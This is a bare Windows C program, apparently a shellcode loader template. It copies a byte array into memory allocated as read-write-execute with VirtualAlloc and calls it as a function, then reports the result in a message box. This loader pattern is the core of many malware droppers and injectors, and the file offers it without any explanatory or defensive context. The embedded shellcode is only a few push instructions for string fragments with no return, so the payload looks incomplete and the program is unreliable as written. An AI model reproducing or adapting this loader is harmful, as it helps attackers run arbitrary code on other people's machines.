#include <windows.h>
#include <string.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x68, 0x78, 0x74, 0x00, 0x00,       
    0x68, 0x61, 0x6D, 0x2E, 0x74,      
    0x68, 0x73, 0x62, 0x75, 0x68        

};

int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
) {
    LPVOID execMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (execMem == NULL) {
        MessageBox(NULL, "Memory allocation failed !!", "Fatal-error",
                   MB_RETRYCANCEL | MB_ICONERROR | MB_DEFBUTTON1);
        return -1;
    }
    memcpy(execMem, shellcode, sizeof(shellcode));
    int (*function)() = (int(*)())execMem;
    int result = function();

    char buffer[100];
    sprintf(buffer, "Shellcode returned: %d", result);
    MessageBox(NULL, buffer, "Details", MB_OK | MB_DEFBUTTON1);
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
